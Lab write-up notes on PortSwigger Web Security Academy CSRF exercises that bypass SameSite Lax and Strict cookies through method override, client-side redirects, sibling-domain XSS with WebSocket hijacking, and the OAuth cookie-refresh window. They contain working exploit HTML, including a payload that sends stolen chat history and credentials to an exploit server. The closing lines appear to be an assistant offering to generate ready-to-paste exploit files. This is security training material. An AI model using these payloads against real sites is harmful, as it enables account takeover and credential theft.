# Cross site request forgery (CSRF) Cookie

## Bypassing SameSite cookie restrictions

* SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites.
* SameSite provides partial protection against a variety of cross-site attacks (eg. CSRF), cross-site leaks, and CORS exploits.

Site context and origins:

* TLD (Top level Domain) `.com, .net`
* TLD +1 (Name of site)
* eTLD (effective Top level Domain)

A Site vs an Origin

* A Site encompasses multiple domain names.
* An Origin includes only one URL (same scheme, domain, and port).

How SameSite works

* SameSite lets browsers and website owners limit which cross-site requests, if any, should include specific cookies.
* SameSite restriction values:
  * Strict
  * Lax
  * None
* Developers configure cookies in the Set-Cookie response header to include the SameSite attribute, e.g.:
  * Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict

Strict

* Cookies are only sent if the browser is already on the same website.
  * Browser will not send it in cross-site requests.
  * If the target site request does not match the browser's address bar, do NOT include the cookie.
* Prevents data modification via cross-site requests.

Lax

* Cookies are sent only if you click a link that takes you to the website.
  * SameSite=Lax: browser will send the cookie for some cross-site requests if both conditions are met:
    * The request uses GET.
    * The request resulted from a top-level navigation (e.g., clicking a link).
  * Cookies are not included in cross-site POST requests.

None

* Cookies are sent everywhere, even from other websites.
  * SameSite=None disables SameSite enforcement; requires Secure for HTTPS-only:
  * Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure

***

### Bypassing SameSite Lax restrictions using GET requests

Lab: SameSite Lax bypass via method override

{% stepper %}
{% step %}
### Introduction

Scenario: A pentester infiltrates a site that uses SameSite cookies with default Lax. Lax blocks session cookies in most cross-site requests but allows them in top-level navigations (clicking a link or visiting a URL directly).
{% endstep %}

{% step %}
### Vulnerability — Problem

* Source: Server supports a method override feature.
* Sink: Change the request method (GET to POST) by providing a special `_method` parameter in the query string.
* Challenge: Send a GET request that is treated by the server as a POST to bypass SameSite=Lax cookie restrictions.
{% endstep %}

{% step %}
### End-goal

Change the account email by converting a cross-site GET into an effective POST using method override.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Login and change the email to observe the POST `/my-account/change-email` request.
* Capture the request via Burp; observe no CSRF tokens/unpredictable values.
* Inspect cookies: no explicit SameSite attribute set — Chrome defaults to Lax.
* In Burp Repeater, change the POST to GET to test whether a GET equivalent exists; server rejects plain GET (expects POST).
{% endstep %}

{% step %}
### Attack

* Use method override by adding `_method=POST` to the query string:

Example modified request: GET /my-account/change-email?email=foo@web-security-academy.net&\_method=POST HTTP/1.1

* Send this modified request (e.g., via Repeater). If the server honors `_method`, it processes as a POST and updates the email.
* Confirm by visiting your account page in the browser.
* Create an exploit on the exploit server that navigates the victim to that URL (top-level navigation so cookie is included).
{% endstep %}

{% step %}
### Deliver & Test

* Store the exploit page on the exploit server and view it yourself to confirm the email changes to pwned@web-security-academy.net.
* Deliver to victim by changing the email in payload to a controlled address and using the exploit server's delivery mechanism.
{% endstep %}
{% endstepper %}

Payload example:

{% code title="exploit.html" %}
```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```
{% endcode %}

<details>

<summary>Why the exploit works</summary>

* SameSite=Lax loophole: Lax cookies are sent during top-level navigations (clicks/redirects). The exploit uses this to include the session cookie.
* Method override: The `_method` parameter lets the server treat a GET as a POST, bypassing method-based protections.

</details>

Real-world analogy: a bank erroneously treats a GET-as-POST due to method-override; clicking a crafted link sends your session cookie and triggers a transfer.

***

### Lab: SameSite Strict bypass via client-side redirect

{% stepper %}
{% step %}
### Introduction

Scenario: After submitting a form, the site does a client-side (JavaScript) redirect. Cookies are set with SameSite=Strict, so they shouldn't be sent in cross-site requests. However, an attacker can manipulate the client-side redirect to load any URL on the bank's website. The internal jump from the confirmation page to the final URL includes the user's session cookie because the browser views it as same-site navigation.
{% endstep %}

{% step %}
### Vulnerability — Problem

* Source: Client-side redirect can be manipulated to load arbitrary bank URLs.
* Sink: The internal redirect is treated as same-site, so Strict cookies are included.
* Challenge: Send a request to a sensitive endpoint (e.g., change email) while cookies are included.
{% endstep %}

{% step %}
### End-goal

Change the user's email address by leveraging the client-side redirect to perform a same-site navigation to a sensitive action.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Login and observe the POST `/my-account/change-email` request; no CSRF tokens present.
* Observe server sets session cookie with SameSite=Strict.
* Find a client-side redirect endpoint, e.g. `/post/comment/confirmation?postId=x`, that reads postId and redirects to `post/{postId}`.
* Try path traversal in `postId` (e.g., `1/../../my-account`) and confirm navigation normalizes to `/my-account`.
{% endstep %}

{% step %}
### Attack

* Use the confirmation redirect gadget to navigate victims into a same-site context, then redirect again to the sensitive endpoint.
* Example final URL (URL-encoding `&` as `%26`):

/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned@web-security-academy.net%26submit=1

* Host an exploit that navigates victims to that confirmation page; once the browser normalizes the redirect, it performs a same-site top-level navigation and includes Strict cookies.
{% endstep %}

{% step %}
### Deliver & Test

* Host the exploit and view it yourself to confirm your email is changed to pwned@web-security-academy.net.
* Deliver to victim by replacing the email with your controlled address and using the exploit server.
{% endstep %}
{% endstepper %}

Payload example:

{% code title="exploit.html" %}
```html
<script>
  document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```
{% endcode %}

<details>

<summary>Why the exploit works</summary>

* Client-side redirect: JS redirects you from /post/comment/confirmation to a final path. Once you’re on the same domain, the navigation is same-site.
* SameSite=Strict bypass: The second navigation is top-level same-site, so Strict cookies are included.
* GET/Method override: The change-email endpoint accepts GET/method-override, so no CSRF token is required.

</details>

***

## CSWSH (Cross-Site WebSocket Hijacking) via sibling-domain XSS

Lab: SameSite Strict bypass via sibling domain (CSWSH attack)

{% stepper %}
{% step %}
### Lab introduction

* Target: webSocket chat system on a child website under a secure parent site.
* Attack vector: find endpoints and analyze which information can be used to access the chat.
* Techniques: XSS on sibling domain + Cross-Site WebSocket Hijacking (CSWSH).
{% endstep %}

{% step %}
### Reconnaissance plan

* Login and open live chat in Burp’s browser; send test messages.
* In Burp -> Proxy -> HTTP history, locate the GET /chat WebSocket handshake.
* Confirm: no CSRF token or Origin protection. Observe WebSocket activity and that sending "READY" triggers full history.
{% endstep %}

{% step %}
### Vulnerability — Problem

* Source: WebSocket `/chat` accepts any message and returns full chat history; lacks CSRF/origin checks.
* Sink: Any message like "READY" triggers full chat history including credentials.
* Challenge: Bypass SameSite=Strict via a sibling domain XSS to run code in a same-site context.
{% endstep %}

{% step %}
### End goal

* Extract victim’s session-authenticated chat history (including credentials) and reuse them to login and complete the lab.
{% endstep %}

{% step %}
### First attempt

Example payload hosted on exploit server:

```html
<script>
let ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");
ws.onopen = () => ws.send("READY");
ws.onmessage = (evt) => {
  fetch("https://your-exploit-server.net/exploit?msg=" + btoa(evt.data));
};
</script>
```

* Triggering this from an external domain fails to receive full history because SameSite=Strict prevents cookies from being sent on cross-site contexts.
{% endstep %}

{% step %}
### Full exploit (sibling-domain XSS)

1. Find a sibling domain (e.g., `cms-LAB_ID.web-security-academy.net`) that is treated as same-site.
2. Discover a reflected XSS on that sibling (e.g., in `username` parameter on login).
3. Inject a URL-based XSS payload that runs the WebSocket extraction script in the sibling domain (same-site context). This lets the WebSocket handshake include the victim’s Strict session cookie and returns full chat history.

Example encoded redirect payload (place this in a page on your exploit server to navigate victim to the sibling login with encoded payload in username):

```html
<script>
document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=URL_ENCODED_CSWSH_PAYLOAD&password=anything";
</script>
```

Final encoded payload example:

```html
<script>
document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=%3Cscript%3Elet%20ws%20%3D%20new%20WebSocket('wss%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2Fchat')%3Bws.onopen%20%3D%20()%20%3D>%20ws.send('READY')%3Bws.onmessage%20%3D%20(evt)%20=%3E%20fetch('https%3A%2F%2Fyour-exploit-server.net%2Fexploit%3Fmsg%3D'%20%2B%20btoa(evt.data))%3B%3C%2Fscript%3E&password=anything";
</script>
```
{% endstep %}

{% step %}
### Why this works

* SameSite=Strict cookies are included when requests originate from a same-site context. A sibling domain that is considered same-site will send those cookies.
* The XSS on the sibling domain runs in the same-site context, allowing an authenticated WebSocket handshake.
* The WebSocket connection accepts a trigger (e.g., "READY") that returns full chat history, exposing credentials without needing a collaborator.
{% endstep %}

{% step %}
### Real-world impact

* SameSite=Strict provides limited protection when sibling subdomains (CMS, marketing, blog) have XSS vulnerabilities.
* WebSocket endpoints are a common oversight for CSRF-like attacks and can lead to full site compromise via sibling-domain XSS.
{% endstep %}
{% endstepper %}

***

### Bypassing SameSite Lax restrictions with newly issued cookies (2-minute window)

What is SameSite=Lax?

* Cookies with SameSite=Lax are not sent with cross-site POST requests.
* They are sent with:
  * top-level GET requests (typing URL or clicking)
  * a first-time POST right after cookie creation (the 2-minute exception described below)

The 2-minute window (Chrome behavior)

* Chrome applies SameSite=Lax by default when a cookie has no explicit SameSite attribute.
* There is a 120-second exception: for up to 2 minutes after a cookie is (re)issued, the browser may allow cross-site POSTs to include that cookie.
* This window can be exploited: force a victim to get a new cookie, then within 2 minutes send a cross-site POST to perform a CSRF.

How to trigger a new cookie

* Force an SSO/OAuth login redirect or visit a login URL that refreshes the session.
* This needs to happen without the browser blocking popups; user interaction (click) can be used to avoid popup blockers:

Example:

```js
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```

Steps summary:

| Step | What you do                        | Why it works                          |
| ---- | ---------------------------------- | ------------------------------------- |
| 1    | Trigger new cookie (login/OAuth)   | Starts 2-minute weak window           |
| 2    | Use window.open() via a user click | Avoids popup blocker                  |
| 3    | Wait for new cookie                | Browser sets new SameSite=Lax cookie  |
| 4    | Send CSRF POST within 2 min        | Cookie will be sent — attack succeeds |
| 5    | Cookie gets protected after 2 min  | Window closes                         |

Key brain hooks:

* Cookies = VIP passes
* SameSite=Lax = “Only use main door”
* 2-minute grace period = temporary weakness
* New cookie = reset the timer
* window.onclick = trick to open login without popup blocking
* OAuth = reliable cookie refresher

***

### Lab: SameSite Lax bypass via cookie refresh (OAuth flow)

{% stepper %}
{% step %}
### Introduction

* Target: `/my-account/change-email` endpoint is vulnerable to CSRF.
* Attack vector: cross-site POST to `/my-account/change-email`.
* Techniques: SameSite=Lax bypass via OAuth login refresh; cross-site POST during 2-minute grace period; popup blocker bypass with window.onclick.
{% endstep %}

{% step %}
### Reconnaissance Plan

* Login with OAuth and intercept POST `/my-account/change-email` in Burp. No CSRF token present.
* Note the session cookie is set without explicit SameSite — Chrome defaults to Lax.
* `/social-login` (or `GET /oauth-callback?code=...`) refreshes the session cookie.
* Popup blockers prevent `window.open` unless triggered by user interaction.
{% endstep %}

{% step %}
### Vulnerability — Problem

* Source: Session cookie is defaulted to Lax (no explicit SameSite=None/Strict).
* Sink: `/my-account/change-email` accepts cross-site POSTs if cookie is included.
* Challenges:
  * The 2-minute clock limits the window.
  * Popup blockers prevent automated opening of the OAuth flow without user action.
{% endstep %}

{% step %}
### End-goal

Perform a CSRF attack that changes the victim's email by:

* Refreshing their session (trigger new cookie).
* Submitting cross-site POST within 2 minutes.
* Using a single user click to avoid popup blockers.
{% endstep %}

{% step %}
### First attempt

Basic CSRF attempt:

```html
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
```

* Works only if executed within 2 minutes of a fresh session cookie being issued.
{% endstep %}

{% step %}
### Exploit with OAuth refresh

Exploit example (attempting automatic refresh + submit):

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

* Initial test may be blocked by popup blockers (no user interaction).
{% endstep %}

{% step %}
### Bypass popup blocker (user interaction)

Modify the exploit so the victim clicks the page:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

* When the victim clicks, `window.open` is allowed, OAuth flow refreshes the cookie, and after \~5s the POST is submitted within the 2-minute window.
* Confirm by visiting the account page to see the email changed.
{% endstep %}

{% step %}
### Final payload

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="pwned@portswigger.net">
</form>

<p>Click anywhere on the page</p>

<script>
  window.onclick = () => {
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);
  }

  function changeEmail() {
    document.forms[0].submit();
  }
</script>
```
{% endstep %}

{% step %}
### Why this works

* Chrome allows session cookies set without SameSite explicitly to be used in cross-site POSTs for up to 2 minutes.
* `social-login` triggers a new session cookie, starting the 2-minute timer.
* `window.onclick` ensures popup isn't blocked.
* Submitting after \~5 seconds means the POST occurs while the browser still includes the new cookie.
{% endstep %}

{% step %}
### Real-world impact

* OAuth/SSO flows commonly refresh cookies; this can open a short CSRF window.
* Attackers only need minimal interaction (one click).
* Without CSRF tokens and with SameSite not set to Strict or None+Secure, apps can be vulnerable.
{% endstep %}
{% endstepper %}

***

If you want, I can:

* Convert any of the labs into standalone GitBook pages (one lab per page).
* Generate ready-to-paste exploit HTML files (with placeholders substituted).
* Produce a checklist for detection/mitigation steps for each vulnerability demonstrated. Which would you prefer?
